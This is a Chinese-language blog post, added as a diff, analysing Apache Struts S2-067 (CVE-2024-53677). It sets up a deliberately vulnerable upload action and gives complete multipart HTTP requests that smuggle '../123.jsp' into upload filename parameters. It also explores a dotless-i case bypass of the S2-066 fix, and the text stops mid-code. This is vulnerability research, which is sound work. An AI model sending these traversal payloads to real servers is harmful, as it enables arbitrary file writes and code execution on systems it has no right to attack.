@@ -1,0 +1,431 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Apache Struts S2-067 漏洞分析 | ph0ebus&#39;s Blog</title>
+  <meta name="author" content="ph0ebus">
+  
+  <meta name="description" content="CVE-2024-53677">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Apache Struts S2-067 漏洞分析"/>
+  <meta property="og:site_name" content="ph0ebus&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/search.xml" title="ph0ebus&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.ico" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">ph0ebus&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/search.xml" title="Subscribe me.">
+			  <i class="fa fa-user"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Apache Struts S2-067 漏洞分析</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> CVE-2024-53677
+		 </div> <!-- alert -->
+	  		
+
+	  <p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/">Apache-Struts2-文件上传逻辑绕过-CVE-2024-53677-S2-067 - y4tacker</a></p>
+<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Apache Struts 是一个开源的、用于构建企业级Java Web应用的MVC框架。2024年12月，Apache 官方披露 CVE-2024-53677 Apache Struts FileUploadInterceptor 文件上传漏洞。在受影响版本中，若代码中使用了FileUploadInterceptor，当进行文件上传时，攻击者可能构造恶意请求利用目录遍历等上传文件至其他目录，在特定场景下可能造成代码执行。</p>
+<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Struts 2.0.0 - Struts 2.3.37</p>
+<p>Struts 2.5.0 - Struts 2.5.33</p>
+<p>Struts 6.0.0 - Struts 6.3.0.2</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a target="_blank" rel="noopener" href="https://github.com/proudwind/struts2_vulns/tree/master/s2vuls">https://github.com/proudwind/struts2_vulns/tree/master/s2vuls</a></p>
+<p>第一次复现struts的漏洞，借助了这个项目搭建环境（自己尝试从零搭环境发现达不到预期效果，访问<code>upload.action</code>返回404，怪）</p>
+<p>clone下来这个目录，然后根据需要增加自己的代码即可</p>
+<p>修改pom.xml，依赖更换为漏洞版本，这里选用6.3.0.2</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.3.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>定义一个UploadAction类</p>
+<p><img src="https://s2.loli.net/2024/12/20/RxGv7CV6FIjEczN.png" alt="img"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.ph0ebus.s2067.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> File upload;</span><br><span class="line">    <span class="keyword">private</span> String uploadContentType;</span><br><span class="line">    <span class="keyword">private</span> String uploadFileName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UploadAction</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> File <span class="title function_">getUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUpload</span><span class="params">(File upload)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.upload = upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadContentType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadContentType</span><span class="params">(String uploadContentType)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadContentType = uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadFileName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadFileName</span><span class="params">(String uploadFileName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadFileName = uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/tmp&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> path + File.separator + <span class="built_in">this</span>.uploadFileName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileUtils.copyFile(<span class="built_in">this</span>.upload, <span class="keyword">new</span> <span class="title class_">File</span>(realPath));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>配置struts.xml，通常在项目路径的&#x2F;WEB-INF&#x2F;classes路径下，添加这个action</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;s2067&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.ph0ebus.s2067.action.UploadAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doUpload&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/12/20/sKTlkPfBRaXtrJo.png" alt="img"></p>
+<p>web.xml当中filter配置好了，可以不用修改</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="单文件上传"><a href="#单文件上传" class="headerlink" title="单文件上传"></a>单文件上传</h2><p><img src="https://s2.loli.net/2024/12/20/zJyYUdKAj3MfD4g.png" alt="img"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2067.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;top.UploadFileName&quot;; </span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">../<span class="number">123.</span>jsp</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/12/20/DKyedJnrTWZIU3S.png" alt="img"></p>
+<h2 id="多文件上传"><a href="#多文件上传" class="headerlink" title="多文件上传"></a>多文件上传</h2><p><img src="https://s2.loli.net/2024/12/20/UaKH72jLFn8rv9u.png" alt="img"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2067s.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryq0PW93h6lyBzjZNZ</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>138</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryq0PW93h6lyBzjZNZ</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;;filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>:  <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryq0PW93h6lyBzjZNZ</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;uploadFileName[0]&quot;;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">../<span class="number">123.</span>jsp</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryq0PW93h6lyBzjZNZ--</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/12/20/XI7hYi46bQBCP93.png" alt="img"></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>官方漏洞通告：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-067">https://cwiki.apache.org/confluence/display/WW/S2-067</a></p>
+<blockquote>
+<p>File upload logic is flawed, and allows an attacker to enable paths with traversals - similar problem as reported in <a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-066">S2-066</a></p>
+</blockquote>
+<p>由此可见，先分析一下S2-066这个漏洞…</p>
+<p>[<a target="_blank" rel="noopener" href="https://blog.ph0ebus.cn/2024/12/15/Apache%20Struts%20S2-066%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/]">https://blog.ph0ebus.cn/2024/12/15/Apache%20Struts%20S2-066%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/]</a>(<a target="_blank" rel="noopener" href="https://blog.ph0ebus.cn/2024/12/15/Apache">https://blog.ph0ebus.cn/2024/12/15/Apache</a> Struts S2-066 漏洞分析&#x2F;)</p>
+<p>而这里的修复方案就是，<code>org.apache.struts2.dispatcher.HttpParameters#appendAll</code>中添加参数时，忽略大小写遍历删除同名参数再做添加</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> HttpParameters <span class="title function_">appendAll</span><span class="params">(Map&lt;String, Parameter&gt; newParams)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.remove(newParams.keySet());</span><br><span class="line">    <span class="built_in">this</span>.parameters.putAll(newParams);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> HttpParameters <span class="title function_">remove</span><span class="params">(Set&lt;String&gt; paramsToRemove)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(String paramName : paramsToRemove) &#123;</span><br><span class="line">        <span class="built_in">this</span>.parameters.entrySet().removeIf((p) -&gt; ((String)p.getKey()).equalsIgnoreCase(paramName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/12/20/VJLKN8hjubq9mfT.png" alt="img"></p>
+<p>在<code>FileUploadInterceptor#intercept</code>将文件上传的参数添加到参数列表时会用到<code>HttpParameters#appendAll</code>这个方法，于是原本利用简单的大小写转换的参数覆盖方式不可行</p>
+<p>在分析S2-066的时候。我注意到一个很有意思的点，在<code>ognl.OgnlRuntime#capitalizeBeanPropertyName</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">capitalizeBeanPropertyName</span><span class="params">(String propertyName)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (propertyName.length() == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName.toUpperCase();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;()&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">3</span>, <span class="number">4</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;set&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;)&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">3</span>, <span class="number">4</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;is&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;()&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">2</span>, <span class="number">3</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">first</span> <span class="operator">=</span> propertyName.charAt(<span class="number">0</span>);</span><br><span class="line">        <span class="type">char</span> <span class="variable">second</span> <span class="operator">=</span> propertyName.charAt(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123;</span><br><span class="line">            <span class="keyword">return</span> propertyName;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">char</span>[] chars = propertyName.toCharArray();</span><br><span class="line">            chars[<span class="number">0</span>] = Character.toUpperCase(chars[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里进行了大写的转换，能联想到部分字符存在大小写转换的特性</p>
+<p><a target="_blank" rel="noopener" href="http://www.lvyyevd.cn/archives/java-yu-yan-zhong-da-xiao-xie-de-te-xing">http://www.lvyyevd.cn/archives/java-yu-yan-zhong-da-xiao-xie-de-te-xing</a></p>
+<p>比如<code>ı</code>转换为大写可以得到字母<code>I</code>，于是能想到，如果上传的参数<code>name</code>第一个字母小写<code>i</code>，能否通过这个特性绕过呢？虽然即使能绕过也不具有通用意义，但是还是试了试</p>
+<p><img src="https://s2.loli.net/2024/12/20/8uoprG1MDevUBac.png" alt="img"></p>
+<p>简单写一个action，这里name设为inter，然后发包，尝试用<code>ınterFileName</code>覆盖</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2067test.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Inter&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;ınterFileName&quot;; </span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">../<span class="number">123.</span>jsp</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/12/20/AIxsSLzNOBv62Cu.png" alt="img"></p>
+<p>不幸的是，这样还是会被<code>equalsIgnoreCase</code>方法检测到然后remove掉恶意参数，看看这个方法的实现逻辑</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equalsIgnoreCase</span><span class="params">(String anotherString)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span> == anotherString) ? <span class="literal">true</span></span><br><span class="line">            : (anotherString != <span class="literal">null</span>)</span><br><span class="line">            &amp;&amp; (anotherString.value.length == value.length)</span><br><span class="line">            &amp;&amp; regionMatches(<span class="literal">true</span>, <span class="number">0</span>, anotherString, <span class="number">0</span>, value.length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">regionMatches</span><span class="params">(<span class="type">boolean</span> ignoreCase, <span class="type">int</span> toffset,</span></span><br><span class="line"><span class="params">        String other, <span class="type">int</span> ooffset, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> ta[] = value;</span><br><span class="line">    <span class="type">int</span> <span class="variable">to</span> <span class="operator">=</span> toffset;</span><br><span class="line">    <span class="type">char</span> pa[] = other.value;</span><br><span class="line">    <span class="type">int</span> <span class="variable">po</span> <span class="operator">=</span> ooffset;</span><br><span class="line">    <span class="comment">// Note: toffset, ooffset, or len might be near -1&gt;&gt;&gt;1.</span></span><br><span class="line">    <span class="keyword">if</span> ((ooffset &lt; <span class="number">0</span>) || (toffset &lt; <span class="number">0</span>)</span><br><span class="line">            || (toffset &gt; (<span class="type">long</span>)value.length - len)</span><br><span class="line">            || (ooffset &gt; (<span class="type">long</span>)other.value.length - len)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span 